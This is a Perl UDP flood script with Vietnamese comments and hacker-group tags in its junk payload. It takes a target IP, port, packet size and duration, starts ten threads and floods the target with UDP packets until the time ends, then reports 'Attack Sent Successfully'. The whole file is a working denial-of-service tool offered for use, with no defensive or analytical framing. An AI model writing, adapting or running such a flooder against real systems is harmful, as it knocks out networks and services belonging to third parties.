#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use threads;

my ($ip, $port, $size, $time) = @ARGV;

# Thiết lập số luồng
my $threads_count = 10;

my @threads;

# Hàm gửi packet
sub send_packet {
    my ($ip, $port, $size, $time) = @_;

my $randstring;
my @hexstrings = (
  "4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa", 
  "RAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracdfgjfgdfgfdgdffghjvbbn5e65436rfdgfxgety45trfgfxgbcfjfhgujkfi645e36hghvbnct546fthgfhgf", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracbvnftgdfhjhgifghh4546thgfvnhfgu65765fgjnbmnbjhksygfhgjkhg5467546tghfghfgjfgfgjgjkgfhghjghghjghjghl", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfjjgKHJGHFjkglkjukHYOIuoIKgiuygfdbhgfjkkkkkkkkkkkkkkkbgjugbhghklkjbhjddfhbgklfdhg;fdhj", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracanonghosthdbfkdjfdsjkhfdlsjhfldsjneonhackervietnamdsgfdghdhsdffhsdfdsh65683dbsfvdsfdsfdsfdsfhfgghgfdgfd", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswarachfgdsjhfgdjsfhgjneonhackervietnamkfjsdhgkjfdghkjdf438dfdsgfdsfgdsfdsfdsfds", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracdfsdfkjhdsfkjganonghostkjhfkdsgfdljfhjdskdskjfbgh435jkgfbfdg", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracneonhackervietnammnsksdjhdshjvfdsjhfdshfghdsgfdsgfhiy43dsvdhksfdsfsdfdsf", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswarackjdfhkjdshfjdhu89fvbcxkbvjfdlgflhgldfkgfdljghfdjlkghfjdlk73246329kjdsfdsfdsfds", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswarachghkgasdsakvcbzxvhjrfsakdmnsbcvksahgrfkasfsalkkhsdgfkdsjhfsdjfbdsfjbsdjfbdskfkdsfbkdjsf", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswarac7186432ekhfvdkh5g4kedsmfbvkdhsfdksgfmnmJFJFJUJHGljgljkghgjghfjh", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracsdfjsdfjkhjdskg8945bbfjlshgtbkjgdskfdnjdsfdsgfkdbblllldsfdsfds", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjds", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnamneonhackervietnam", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjdsanonghostanonghostanonghostanonghostanonghostanonghostanonghost", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjdsdsfdfghostghostghostghostghostghost", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjdshjagsafdgjasdgjsferiy43rdsfds", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjdsdfgdfgfdgooglekjhadjlashttp", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaracfhdgshkfgkdsfkjl42h5dskgbfkjdshgfkjdsdnsntphttp", 
  "xNeonnDzaiProrepa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"
  );

    my $counter = 0;
    do { 
        $randstring .= splice(@hexstrings, int rand @hexstrings, 1); 
        ++$counter;
    } until $counter == 1051;

    my $socket = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $port,
        Proto    => 'udp'
    ) or die "Can't create socket: $!\n";

    print "Attack Sent Successfully | $ip : $port : $size : $time \n";

    my $endtime = time() + ($time ? $time : 100);

    while (time() <= $endtime) {
        my $psize = $size ? $size : int(rand(1024 - 64) + 64);
        $socket->send(pack("a$psize", $randstring));
    }

    $socket->close();
}

# Tạo các luồng
for (1 .. $threads_count) {
    push @threads, threads->create(\&send_packet, $ip, $port, $size, $time);
}

# Chờ tất cả các luồng hoàn thành
foreach my $thread (@threads) {
    $thread->join();
}
